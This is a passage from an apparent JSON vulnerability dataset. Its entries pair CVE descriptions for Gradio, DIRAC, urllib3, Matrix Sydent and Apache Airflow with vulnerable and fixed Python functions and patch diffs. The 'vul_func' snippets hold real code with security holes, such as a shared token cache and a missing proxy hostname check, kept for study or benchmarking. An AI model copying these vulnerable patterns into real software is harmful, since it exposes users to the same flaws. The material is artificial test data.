stat_result=os.stat(abs_path),\n                    )\n                    return response\n\n            return FileResponse(abs_path, headers={\"Accept-Ranges\": \"bytes\"})"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_82_1",
        "commit": "7ba8c5d",
        "file_path": "gradio/routes.py",
        "start_line": "434",
        "end_line": "484",
        "snippet": "        async def file(path_or_url: str, request: fastapi.Request):\n            blocks = app.get_blocks()\n            if client_utils.is_http_url_like(path_or_url):\n                return RedirectResponse(\n                    url=path_or_url, status_code=status.HTTP_302_FOUND\n                )\n            abs_path = utils.abspath(path_or_url)\n\n            in_blocklist = any(\n                utils.is_in_or_equal(abs_path, blocked_path)\n                for blocked_path in blocks.blocked_paths\n            )\n            is_dir = abs_path.is_dir()\n\n            if in_blocklist or is_dir:\n                raise HTTPException(403, f\"File not allowed: {path_or_url}.\")\n\n            created_by_app = str(abs_path) in set().union(*blocks.temp_file_sets)\n            in_allowlist = any(\n                utils.is_in_or_equal(abs_path, allowed_path)\n                for allowed_path in blocks.allowed_paths\n            )\n            was_uploaded = utils.is_in_or_equal(abs_path, app.uploaded_file_dir)\n            is_cached_example = utils.is_in_or_equal(\n                abs_path, utils.abspath(CACHED_FOLDER)\n            )\n\n            if not (\n                created_by_app or in_allowlist or was_uploaded or is_cached_example\n            ):\n                raise HTTPException(403, f\"File not allowed: {path_or_url}.\")\n\n            if not abs_path.exists():\n                raise HTTPException(404, f\"File not found: {path_or_url}.\")\n\n            range_val = request.headers.get(\"Range\", \"\").strip()\n            if range_val.startswith(\"bytes=\") and \"-\" in range_val:\n                range_val = range_val[6:]\n                start, end = range_val.split(\"-\")\n                if start.isnumeric() and end.isnumeric():\n                    start = int(start)\n                    end = int(end)\n                    response = ranged_response.RangedFileResponse(\n                        abs_path,\n                        ranged_response.OpenRange(start, end),\n                        dict(request.headers),\n                        stat_result=os.stat(abs_path),\n                    )\n                    return response\n\n            return FileResponse(abs_path, headers={\"Accept-Ranges\": \"bytes\"})"
      }
    ],
    "vul_patch": "--- a/gradio/routes.py\n+++ b/gradio/routes.py\n@@ -1,6 +1,6 @@\n         async def file(path_or_url: str, request: fastapi.Request):\n             blocks = app.get_blocks()\n-            if utils.validate_url(path_or_url):\n+            if client_utils.is_http_url_like(path_or_url):\n                 return RedirectResponse(\n                     url=path_or_url, status_code=status.HTTP_302_FOUND\n                 )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-24825",
    "cve_description": "DIRAC is a distributed resource framework. In affected versions any user could get a token that has been requested by another user/agent. This may expose resources to unintended parties. This issue has been addressed in release version 8.0.37. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/DIRACGrid/DIRAC",
    "patch_url": [
      "https://github.com/DIRACGrid/DIRAC/commit/f9ddab755b9a69acb85e14d2db851d8ac0c9648c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_163_1",
        "commit": "a048eb2",
        "file_path": "src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py",
        "start_line": 51,
        "end_line": 52,
        "snippet": "# Used to synchronize the cache with user tokens\ngTokensSync = ThreadSafe.Synchronizer()"
      },
      {
        "id": "vul_py_163_2",
        "commit": "a048eb2",
        "file_path": "src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py",
        "start_line": 58,
        "end_line": 78,
        "snippet": "    @classmethod\n    def initializeHandler(cls, *args):\n        \"\"\"Initialization\n\n        :return: S_OK()/S_ERROR()\n        \"\"\"\n        # Cache containing tokens from scope requested by the client\n        cls.__tokensCache = DictCache()\n\n        # The service plays an important OAuth 2.0 role, namely it is an Identity Provider client.\n        # This allows you to manage tokens without the involvement of their owners.\n        cls.idps = IdProviderFactory()\n\n        # Let's try to connect to the database\n        try:\n            cls.__tokenDB = TokenDB(parentLogger=cls.log)\n        except Exception as e:\n            cls.log.exception(e)\n            return S_ERROR(f\"Could not connect to the database {repr(e)}\")\n\n        return S_OK()"
      },
      {
        "id": "vul_py_163_3",
        "commit": "a048eb2",
        "file_path": "src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py",
        "start_line": 184,
        "end_line": 275,
        "snippet": "    @gTokensSync\n    def export_getToken(\n        self,\n        username: str = None,\n        userGroup: str = None,\n        scope: list[str] = None,\n        audience: str = None,\n        identityProvider: str = None,\n        requiredTimeLeft: int = 0,\n    ):\n        \"\"\"Get an access token for a user/group.\n\n        * Properties:\n            * FullDelegation <- permits full delegation of tokens\n            * LimitedDelegation <- permits downloading only limited tokens\n            * PrivateLimitedDelegation <- permits downloading only limited tokens for one self\n\n        :param username: user name\n        :param userGroup: user group\n        :param scope: requested scope\n        :param audience: requested audience\n        :param identityProvider: Identity Provider name\n        :param requiredTimeLeft: requested minimum life time\n\n        :return: S_OK(dict)/S_ERROR()\n        \"\"\"\n        # Get an IdProvider Client instance\n        result = getIdProviderClient(userGroup, identityProvider)\n        if not result[\"OK\"]:\n            return result\n        idpObj = result[\"Value\"]\n\n        # Search for an existing token in tokensCache\n        cachedKey = getCachedKey(idpObj, username, userGroup, scope, audience)\n        result = getCachedToken(self.__tokensCache, cachedKey, requiredTimeLeft)\n        if result[\"OK\"]:\n            # A valid token has been found and is returned\n            return result\n\n        # A client token is requested\n        if not username:\n            result = self.__checkProperties(\"\", \"\")\n            if not result[\"OK\"]:\n                return result\n\n            # Get the client token with requested scope and audience\n            scope = cachedKey[1]\n            audience = cachedKey[2]\n            result = idpObj.fetchToken(grant_type=\"client_credentials\", scope=scope, audience=audience)\n            if not result[\"OK\"]:\n                return result\n            token = result[\"Value\"]\n\n            # Caching new token: only get an access token (no refresh token in this context)\n            self.__tokensCache.add(\n                cachedKey,\n                result[\"Value\"].get_claim(\"exp\", \"access_token\") or DEFAULT_AT_EXPIRATION_TIME,\n                token,\n            )\n            return result\n\n        # A user token is requested\n        err = []\n        # No luck so far, let's refresh the token stored in the database\n        result = Registry.getDNForUsername(username)\n        if not result[\"OK\"]:\n            return result\n        for dn in result[\"Value\"]:\n            # For backward compatibility, the user ID is written as DN. So let's check if this DN contains a user ID\n            result = Registry.getIDFromDN(dn)\n            if result[\"OK\"]:\n                uid = result[\"Value\"]\n                # To do this, first find the refresh token stored in the database with the maximum scope\n                result = self.__tokenDB.getTokenForUserProvider(uid, idpObj.name)\n                if result[\"OK\"] and result[\"Value\"]:\n                    tokens = result[\"Value\"]\n                    result = self.__checkProperties(dn, userGroup)\n                    if result[\"OK\"]:\n                        # refresh token with requested scope\n                        result = idpObj.refreshToken(tokens.get(\"refresh_token\"), group=userGroup, scope=scope)\n                        if result[\"OK\"]:\n                            # caching new tokens\n                            self.__tokensCache.add(\n                                cachedKey,\n                                result[\"Value\"].get_claim(\"exp\", \"refresh_token\") or DEFAULT_RT_EXPIRATION_TIME,\n                                result[\"Value\"],\n                            )\n                            return result\n                # Did not find any token associated with the found user ID\n                err.append(result.get(\"Message\", f\"No token found for {uid}\"))\n        # Collect all errors when trying to get a token, or if no user ID is registered\n        return S_ERROR(\"; \".join(err or [f\"No user ID found for {username}\"]))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_163_2",
        "commit": "f9ddab7",
        "file_path": "src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py",
        "start_line": 52,
        "end_line": 70,
        "snippet": "    @classmethod\n    def initializeHandler(cls, *args):\n        \"\"\"Initialization\n\n        :return: S_OK()/S_ERROR()\n        \"\"\"\n\n        # The service plays an important OAuth 2.0 role, namely it is an Identity Provider client.\n        # This allows you to manage tokens without the involvement of their owners.\n        cls.idps = IdProviderFactory()\n\n        # Let's try to connect to the database\n        try:\n            cls.__tokenDB = TokenDB(parentLogger=cls.log)\n        except Exception as e:\n            cls.log.exception(e)\n            return S_ERROR(f\"Could not connect to the database {repr(e)}\")\n\n        return S_OK()"
      },
      {
        "id": "fix_py_163_3",
        "commit": "f9ddab7",
        "file_path": "src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py",
        "start_line": 176,
        "end_line": 245,
        "snippet": "    def export_getToken(\n        self,\n        username: str = None,\n        userGroup: str = None,\n        scope: list[str] = None,\n        audience: str = None,\n        identityProvider: str = None,\n        requiredTimeLeft: int = 0,\n    ):\n        \"\"\"Get an access token for a user/group.\n\n        * Properties:\n            * FullDelegation <- permits full delegation of tokens\n            * LimitedDelegation <- permits downloading only limited tokens\n            * PrivateLimitedDelegation <- permits downloading only limited tokens for one self\n\n        :param username: user name\n        :param userGroup: user group\n        :param scope: requested scope\n        :param audience: requested audience\n        :param identityProvider: Identity Provider name\n        :param requiredTimeLeft: requested minimum life time\n\n        :return: S_OK(dict)/S_ERROR()\n        \"\"\"\n        # Get an IdProvider Client instance\n        result = getIdProviderClient(userGroup, identityProvider)\n        if not result[\"OK\"]:\n            return result\n        idpObj = result[\"Value\"]\n\n        # getCachedKey is just used here to resolve the default scopes\n        _, scope, *_ = getCachedKey(idpObj, username, userGroup, scope, audience)\n\n        # A client token is requested\n        if not username:\n            result = self.__checkProperties(\"\", \"\")\n            if not result[\"OK\"]:\n                return result\n\n            # Get the client token with requested scope and audience\n            result = idpObj.fetchToken(grant_type=\"client_credentials\", scope=scope, audience=audience)\n\n            return result\n\n        # A user token is requested\n        err = []\n        # No luck so far, let's refresh the token stored in the database\n        result = Registry.getDNForUsername(username)\n        if not result[\"OK\"]:\n            return result\n        for dn in result[\"Value\"]:\n            # For backward compatibility, the user ID is written as DN. So let's check if this DN contains a user ID\n            result = Registry.getIDFromDN(dn)\n            if result[\"OK\"]:\n                uid = result[\"Value\"]\n                # To do this, first find the refresh token stored in the database with the maximum scope\n                result = self.__tokenDB.getTokenForUserProvider(uid, idpObj.name)\n                if result[\"OK\"] and result[\"Value\"]:\n                    tokens = result[\"Value\"]\n                    result = self.__checkProperties(dn, userGroup)\n                    if result[\"OK\"]:\n                        # refresh token with requested scope\n                        result = idpObj.refreshToken(tokens.get(\"refresh_token\"), group=userGroup, scope=scope)\n                        if result[\"OK\"]:\n                            return result\n                # Did not find any token associated with the found user ID\n                err.append(result.get(\"Message\", f\"No token found for {uid}\"))\n        # Collect all errors when trying to get a token, or if no user ID is registered\n        return S_ERROR(\"; \".join(err or [f\"No user ID found for {username}\"]))"
      }
    ],
    "vul_patch": "--- a/src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py\n+++ /dev/null\n@@ -1,2 +0,0 @@\n-# Used to synchronize the cache with user tokens\n-gTokensSync = ThreadSafe.Synchronizer()\n\n--- a/src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py\n+++ b/src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py\n@@ -4,8 +4,6 @@\n \n         :return: S_OK()/S_ERROR()\n         \"\"\"\n-        # Cache containing tokens from scope requested by the client\n-        cls.__tokensCache = DictCache()\n \n         # The service plays an important OAuth 2.0 role, namely it is an Identity Provider client.\n         # This allows you to manage tokens without the involvement of their owners.\n\n--- a/src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py\n+++ b/src/DIRAC/FrameworkSystem/Service/TokenManagerHandler.py\n@@ -1,4 +1,3 @@\n-    @gTokensSync\n     def export_getToken(\n         self,\n         username: str = None,\n@@ -30,12 +29,8 @@\n             return result\n         idpObj = result[\"Value\"]\n \n-        # Search for an existing token in tokensCache\n-        cachedKey = getCachedKey(idpObj, username, userGroup, scope, audience)\n-        result = getCachedToken(self.__tokensCache, cachedKey, requiredTimeLeft)\n-        if result[\"OK\"]:\n-            # A valid token has been found and is returned\n-            return result\n+        # getCachedKey is just used here to resolve the default scopes\n+        _, scope, *_ = getCachedKey(idpObj, username, userGroup, scope, audience)\n \n         # A client token is requested\n         if not username:\n@@ -44,19 +39,8 @@\n                 return result\n \n             # Get the client token with requested scope and audience\n-            scope = cachedKey[1]\n-            audience = cachedKey[2]\n             result = idpObj.fetchToken(grant_type=\"client_credentials\", scope=scope, audience=audience)\n-            if not result[\"OK\"]:\n-                return result\n-            token = result[\"Value\"]\n \n-            # Caching new token: only get an access token (no refresh token in this context)\n-            self.__tokensCache.add(\n-                cachedKey,\n-                result[\"Value\"].get_claim(\"exp\", \"access_token\") or DEFAULT_AT_EXPIRATION_TIME,\n-                token,\n-            )\n             return result\n \n         # A user token is requested\n@@ -79,12 +63,6 @@\n                         # refresh token with requested scope\n                         result = idpObj.refreshToken(tokens.get(\"refresh_token\"), group=userGroup, scope=scope)\n                         if result[\"OK\"]:\n-                            # caching new tokens\n-                            self.__tokensCache.add(\n-                                cachedKey,\n-                                result[\"Value\"].get_claim(\"exp\", \"refresh_token\") or DEFAULT_RT_EXPIRATION_TIME,\n-                                result[\"Value\"],\n-                            )\n                             return result\n                 # Did not find any token associated with the found user ID\n                 err.append(result.get(\"Message\", f\"No token found for {uid}\"))\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-28363",
    "cve_description": "The urllib3 library 1.26.x before 1.26.4 for Python omits SSL certificate validation in some cases involving HTTPS to HTTPS proxies. The initial connection to the HTTPS proxy (if an SSLContext isn't given via proxy_config) doesn't verify the hostname of the certificate. This means certificates for different servers that still validate properly with the default urllib3 SSLContext will be silently accepted.",
    "cwe_info": {
      "CWE-295": {
        "name": "Improper Certificate Validation",
        "description": "The product does not validate, or incorrectly validates, a certificate."
      }
    },
    "repo": "https://github.com/urllib3/urllib3",
    "patch_url": [
      "https://github.com/urllib3/urllib3/commit/8d65ea1ecf6e2cdc27d42124e587c1b83a3118b0"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_85_1",
        "commit": "5e34326",
        "file_path": "src/urllib3/connection.py",
        "start_line": "471",
        "end_line": "503",
        "snippet": "    def _connect_tls_proxy(self, hostname, conn):\n        \"\"\"\n        Establish a TLS connection to the proxy using the provided SSL context.\n        \"\"\"\n        proxy_config = self.proxy_config\n        ssl_context = proxy_config.ssl_context\n        if ssl_context:\n            # If the user provided a proxy context, we assume CA and client\n            # certificates have already been set\n            return ssl_wrap_socket(\n                sock=conn,\n                server_hostname=hostname,\n                ssl_context=ssl_context,\n            )\n\n        ssl_context = create_proxy_ssl_context(\n            self.ssl_version,\n            self.cert_reqs,\n            self.ca_certs,\n            self.ca_cert_dir,\n            self.ca_cert_data,\n        )\n\n        # If no cert was provided, use only the default options for server\n        # certificate validation\n        return ssl_wrap_socket(\n            sock=conn,\n            ca_certs=self.ca_certs,\n            ca_cert_dir=self.ca_cert_dir,\n            ca_cert_data=self.ca_cert_data,\n            server_hostname=hostname,\n            ssl_context=ssl_context,\n        )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_85_1",
        "commit": "8d65ea1",
        "file_path": "src/urllib3/connection.py",
        "start_line": "471",
        "end_line": "507",
        "snippet": "    def _connect_tls_proxy(self, hostname, conn):\n        \"\"\"\n        Establish a TLS connection to the proxy using the provided SSL context.\n        \"\"\"\n        proxy_config = self.proxy_config\n        ssl_context = proxy_config.ssl_context\n        if ssl_context:\n            # If the user provided a proxy context, we assume CA and client\n            # certificates have already been set\n            return ssl_wrap_socket(\n                sock=conn,\n                server_hostname=hostname,\n                ssl_context=ssl_context,\n            )\n\n        ssl_context = create_proxy_ssl_context(\n            self.ssl_version,\n            self.cert_reqs,\n            self.ca_certs,\n            self.ca_cert_dir,\n            self.ca_cert_data,\n        )\n        # By default urllib3's SSLContext disables `check_hostname` and uses\n        # a custom check. For proxies we're good with relying on the default\n        # verification.\n        ssl_context.check_hostname = True\n\n        # If no cert was provided, use only the default options for server\n        # certificate validation\n        return ssl_wrap_socket(\n            sock=conn,\n            ca_certs=self.ca_certs,\n            ca_cert_dir=self.ca_cert_dir,\n            ca_cert_data=self.ca_cert_data,\n            server_hostname=hostname,\n            ssl_context=ssl_context,\n        )"
      }
    ],
    "vul_patch": "--- a/src/urllib3/connection.py\n+++ b/src/urllib3/connection.py\n@@ -20,6 +20,10 @@\n             self.ca_cert_dir,\n             self.ca_cert_data,\n         )\n+        # By default urllib3's SSLContext disables `check_hostname` and uses\n+        # a custom check. For proxies we're good with relying on the default\n+        # verification.\n+        ssl_context.check_hostname = True\n \n         # If no cert was provided, use only the default options for server\n         # certificate validation\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-11340",
    "cve_description": "util/emailutils.py in Matrix Sydent before 1.0.2 mishandles registration restrictions that are based on e-mail domain, if the allowed_local_3pids option is enabled. This occurs because of potentially unwanted behavior in Python, in which an email.utils.parseaddr call on user@bad.example.net@good.example.com returns the user@bad.example.net substring.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/matrix-org/sydent",
    "patch_url": [
      "https://github.com/matrix-org/sydent/commit/4e1cfff53429c49c87d5c457a18ed435520044fc"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_243_1",
        "commit": "617ff31",
        "file_path": "sydent/util/emailutils.py",
        "start_line": 34,
        "end_line": 86,
        "snippet": "def sendEmail(sydent, templateName, mailTo, substitutions):\n        mailFrom = sydent.cfg.get('email', 'email.from')\n        mailTemplateFile = sydent.cfg.get('email', templateName)\n\n        myHostname = sydent.cfg.get('email', 'email.hostname')\n        if myHostname == '':\n            myHostname = socket.getfqdn()\n        midRandom = \"\".join([random.choice(string.ascii_letters) for _ in range(16)])\n        messageid = \"<%d%s@%s>\" % (time_msec(), midRandom, myHostname)\n\n        allSubstitutions = {}\n        allSubstitutions.update(substitutions)\n        allSubstitutions.update({\n            'messageid': messageid,\n            'date': email.utils.formatdate(localtime=False),\n            'to': mailTo,\n            'from': mailFrom,\n        })\n\n        for k,v in allSubstitutions.items():\n            allSubstitutions[k] = v.decode('utf8')\n            allSubstitutions[k+\"_forhtml\"] = cgi.escape(v.decode('utf8'))\n            allSubstitutions[k+\"_forurl\"] = urllib.quote(v)\n\n        mailString = open(mailTemplateFile).read() % allSubstitutions\n        rawFrom = email.utils.parseaddr(mailFrom)[1]\n        rawTo = email.utils.parseaddr(mailTo)[1]\n        if rawFrom == '' or rawTo == '':\n            logger.info(\"Couldn't parse from / to address %s / %s\", mailFrom, mailTo)\n            raise EmailAddressException()\n        mailServer = sydent.cfg.get('email', 'email.smtphost')\n        mailPort = sydent.cfg.get('email', 'email.smtpport')\n        mailUsername = sydent.cfg.get('email', 'email.smtpusername')\n        mailPassword = sydent.cfg.get('email', 'email.smtppassword')\n        mailTLSMode = sydent.cfg.get('email', 'email.tlsmode')\n        logger.info(\"Sending mail to %s with mail server: %s\" % (mailTo, mailServer,))\n        try:\n            if mailTLSMode == 'SSL' or mailTLSMode == 'TLS':\n                smtp = smtplib.SMTP_SSL(mailServer, mailPort, myHostname)\n            elif mailTLSMode == 'STARTTLS':\n                smtp = smtplib.SMTP(mailServer, mailPort, myHostname)\n                smtp.starttls()\n            else:\n                smtp = smtplib.SMTP(mailServer, mailPort, myHostname)\n            if mailUsername != '':\n                smtp.login(mailUsername, mailPassword)\n            smtp.sendmail(rawFrom, rawTo, mailString.encode('utf-8'))\n            smtp.quit()\n        except Exception as origException:\n            twisted.python.log.err()\n            ese = EmailSendException()\n            ese.cause = origException\n            raise ese"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_243_1",
        "commit": "4e1cfff",
        "file_path": "sydent/util/emailutils.py",
        "start_line": 34,
        "end_line": 92,
        "snippet": "def sendEmail(sydent, templateName, mailTo, substitutions):\n        mailFrom = sydent.cfg.get('email', 'email.from')\n        mailTemplateFile = sydent.cfg.get('email', templateName)\n\n        myHostname = sydent.cfg.get('email', 'email.hostname')\n        if myHostname == '':\n            myHostname = socket.getfqdn()\n        midRandom = \"\".join([random.choice(string.ascii_letters) for _ in range(16)])\n        messageid = \"<%d%s@%s>\" % (time_msec(), midRandom, myHostname)\n\n        allSubstitutions = {}\n        allSubstitutions.update(substitutions)\n        allSubstitutions.update({\n            'messageid': messageid,\n            'date': email.utils.formatdate(localtime=False),\n            'to': mailTo,\n            'from': mailFrom,\n        })\n\n        for k,v in allSubstitutions.items():\n            allSubstitutions[k] = v.decode('utf8')\n            allSubstitutions[k+\"_forhtml\"] = cgi.escape(v.decode('utf8'))\n            allSubstitutions[k+\"_forurl\"] = urllib.quote(v)\n\n        mailString = open(mailTemplateFile).read().decode('utf8') % allSubstitutions\n        parsedFrom = email.utils.parseaddr(mailFrom)[1]\n        parsedTo = email.utils.parseaddr(mailTo)[1]\n        if parsedFrom == '' or parsedTo == '':\n            logger.info(\"Couldn't parse from / to address %s / %s\", mailFrom, mailTo)\n            raise EmailAddressException()\n\n        mailServer = sydent.cfg.get('email', 'email.smtphost')\n        mailPort = sydent.cfg.get('email', 'email.smtpport')\n        mailUsername = sydent.cfg.get('email', 'email.smtpusername')\n        mailPassword = sydent.cfg.get('email', 'email.smtppassword')\n        mailTLSMode = sydent.cfg.get('email', 'email.tlsmode')\n        logger.info(\"Sending mail to %s with mail server: %s\" % (mailTo, mailServer,))\n        try:\n            if mailTLSMode == 'SSL' or mailTLSMode == 'TLS':\n                smtp = smtplib.SMTP_SSL(mailServer, mailPort, myHostname)\n            elif mailTLSMode == 'STARTTLS':\n                smtp = smtplib.SMTP(mailServer, mailPort, myHostname)\n                smtp.starttls()\n            else:\n                smtp = smtplib.SMTP(mailServer, mailPort, myHostname)\n            if mailUsername != '':\n                smtp.login(mailUsername, mailPassword)\n\n            # We're using the parsing above to do basic validation, but instead of\n            # failing it may munge the address it returns. So we should *not* use\n            # that parsed address, as it may not match any validation done\n            # elsewhere.\n            smtp.sendmail(mailFrom, mailTo, mailString.encode('utf-8'))\n            smtp.quit()\n        except Exception as origException:\n            twisted.python.log.err()\n            ese = EmailSendException()\n            ese.cause = origException\n            raise ese"
      }
    ],
    "vul_patch": "--- a/sydent/util/emailutils.py\n+++ b/sydent/util/emailutils.py\n@@ -22,12 +22,13 @@\n             allSubstitutions[k+\"_forhtml\"] = cgi.escape(v.decode('utf8'))\n             allSubstitutions[k+\"_forurl\"] = urllib.quote(v)\n \n-        mailString = open(mailTemplateFile).read() % allSubstitutions\n-        rawFrom = email.utils.parseaddr(mailFrom)[1]\n-        rawTo = email.utils.parseaddr(mailTo)[1]\n-        if rawFrom == '' or rawTo == '':\n+        mailString = open(mailTemplateFile).read().decode('utf8') % allSubstitutions\n+        parsedFrom = email.utils.parseaddr(mailFrom)[1]\n+        parsedTo = email.utils.parseaddr(mailTo)[1]\n+        if parsedFrom == '' or parsedTo == '':\n             logger.info(\"Couldn't parse from / to address %s / %s\", mailFrom, mailTo)\n             raise EmailAddressException()\n+\n         mailServer = sydent.cfg.get('email', 'email.smtphost')\n         mailPort = sydent.cfg.get('email', 'email.smtpport')\n         mailUsername = sydent.cfg.get('email', 'email.smtpusername')\n@@ -44,7 +45,12 @@\n                 smtp = smtplib.SMTP(mailServer, mailPort, myHostname)\n             if mailUsername != '':\n                 smtp.login(mailUsername, mailPassword)\n-            smtp.sendmail(rawFrom, rawTo, mailString.encode('utf-8'))\n+\n+            # We're using the parsing above to do basic validation, but instead of\n+            # failing it may munge the address it returns. So we should *not* use\n+            # that parsed address, as it may not match any validation done\n+            # elsewhere.\n+            smtp.sendmail(mailFrom, mailTo, mailString.encode('utf-8'))\n             smtp.quit()\n         except Exception as origException:\n             twisted.python.log.err()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-37379",
    "cve_description": "Apache Airflow, in versions prior to 2.7.0, contains a security vulnerability that can be exploited by an authenticated user possessing Connection edit privileges. This vulnerability allows the user to access connection information and exploit the test connection feature by sending many requests, leading to a denial of service (DoS) condition on the server. Furthermore, malicious actors can leverage this vulnerability to establish harmful connections with the server.\n\nUsers of Apache Airflow are strongly advised to upgrade to version 2.7.0 or newer to mitigate the risk associated with this vulnerability. Additionally, administrators are encouraged to review and adjust user permissions to restrict access to sensitive functionalities, reducing the attack surface.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/e4c3ecf8ceaefa17525b495e4bcb5b2f41309603"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_332_1",
        "commit": "3c3c337",
        "file_path": "airflow/api_connexion/endpoints/connection_endpoint.py",
        "start_line": 175,
        "end_line": 197,
        "snippet": "def test_connection() -> APIResponse:\n    \"\"\"\n    Test an API connection.\n\n    This method first creates an in-memory transient conn_id & exports that to an\n    env var, as some hook classes tries to find out the conn from their __init__ method & errors out\n    if not found. It also deletes the conn id env variable after the test.\n    \"\"\"\n    body = request.json\n    transient_conn_id = get_random_string()\n    conn_env_var = f\"{CONN_ENV_PREFIX}{transient_conn_id.upper()}\"\n    try:\n        data = connection_schema.load(body)\n        data[\"conn_id\"] = transient_conn_id\n        conn = Connection(**data)\n        os.environ[conn_env_var] = conn.get_uri()\n        status, message = conn.test_connection()\n        return connection_test_schema.dump({\"status\": status, \"message\": message})\n    except ValidationError as err:\n        raise BadRequest(detail=str(err.messages))\n    finally:\n        if conn_env_var in os.environ:\n            del os.environ[conn_env_var]"
      },
      {
        "id": "vul_py_332_2",
        "commit": "3c3c337",
        "file_path": "airflow/cli/commands/connection_command.py",
        "start_line": 343,
        "end_line": 359,
        "snippet": "def connections_test(args) -> None:\n    \"\"\"Test an Airflow connection.\"\"\"\n    console = AirflowConsole()\n\n    print(f\"Retrieving connection: {args.conn_id!r}\")\n    try:\n        conn = BaseHook.get_connection(args.conn_id)\n    except AirflowNotFoundException:\n        console.print(\"[bold yellow]\\nConnection not found.\\n\")\n        raise SystemExit(1)\n\n    print(\"\\nTesting...\")\n    status, message = conn.test_connection()\n    if status is True:\n        console.print(\"[bold green]\\nConnection success!\\n\")\n    else:\n        console.print(f\"[bold][red]\\nConnection failed![/bold]\\n{message}\\n\")"
      },
      {
        "id": "vul_py_332_3",
        "commit": "3c3c337",
        "file_path": "airflow/www/extensions/init_jinja_globals.py",
        "start_line": 57,
        "end_line": 87,
        "snippet": "    def prepare_jinja_globals():\n        extra_globals = {\n            \"server_timezone\": server_timezone,\n            \"default_ui_timezone\": default_ui_timezone,\n            \"hostname\": hostname,\n            \"navbar_color\": conf.get(\"webserver\", \"NAVBAR_COLOR\"),\n            \"log_fetch_delay_sec\": conf.getint(\"webserver\", \"log_fetch_delay_sec\", fallback=2),\n            \"log_auto_tailing_offset\": conf.getint(\"webserver\", \"log_auto_tailing_offset\", fallback=30),\n            \"log_animation_speed\": conf.getint(\"webserver\", \"log_animation_speed\", fallback=1000),\n            \"state_color_mapping\": STATE_COLORS,\n            \"airflow_version\": airflow_version,\n            \"git_version\": git_version,\n            \"k8s_or_k8scelery_executor\": IS_K8S_OR_K8SCELERY_EXECUTOR,\n            \"rest_api_enabled\": False,\n        }\n\n        backends = conf.get(\"api\", \"auth_backends\")\n        if len(backends) > 0 and backends[0] != \"airflow.api.auth.backend.deny_all\":\n            extra_globals[\"rest_api_enabled\"] = True\n\n        if \"analytics_tool\" in conf.getsection(\"webserver\"):\n            extra_globals.update(\n                {\n                    \"analytics_tool\": conf.get(\"webserver\", \"ANALYTICS_TOOL\"),\n                    \"analytics_id\": conf.get(\"webserver\", \"ANALYTICS_ID\"),\n                }\n            )\n\n        return extra_globals\n\n    app.context_processor(prepare_jinja_globals)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_332_1",
        "commit": "e4c3ecf8ceaefa17525b495e4bcb5b2f41309603",
        "file_path": "airflow/api_connexion/endpoints/connection_endpoint.py",
        "start_line": 176,
        "end_line": 205,
        "snippet": "def test_connection() -> APIResponse:\n    \"\"\"\n    Test an API connection.\n\n    This method first creates an in-memory transient conn_id & exports that to an\n    env var, as some hook classes tries to find out the conn from their __init__ method & errors out\n    if not found. It also deletes the conn id env variable after the test.\n    \"\"\"\n    if conf.get(\"core\", \"test_connection\", fallback=\"Disabled\").lower().strip() != \"enabled\":\n        return Response(\n            \"Testing connections is disabled in Airflow configuration. Contact your deployment admin to \"\n            \"enable it.\",\n            403,\n        )\n\n    body = request.json\n    transient_conn_id = get_random_string()\n    conn_env_var = f\"{CONN_ENV_PREFIX}{transient_conn_id.upper()}\"\n    try:\n        data = connection_schema.load(body)\n        data[\"conn_id\"] = transient_conn_id\n        conn = Connection(**data)\n        os.environ[conn_env_var] = conn.get_uri()\n        status, message = conn.test_connection()\n        return connection_test_schema.dump({\"status\": status, \"message\": message})\n    except ValidationError as err:\n        raise BadRequest(detail=str(err.messages))\n    finally:\n        if conn_env_var in os.environ:\n            del os.environ[conn_env_var]"
      },
      {
        "id": "fix_py_332_2",
        "commit": "e4c3ecf8ceaefa17525b495e4bcb5b2f41309603",
        "file_path": "airflow/cli/commands/connection_command.py",
        "start_line": 344,
        "end_line": 366,
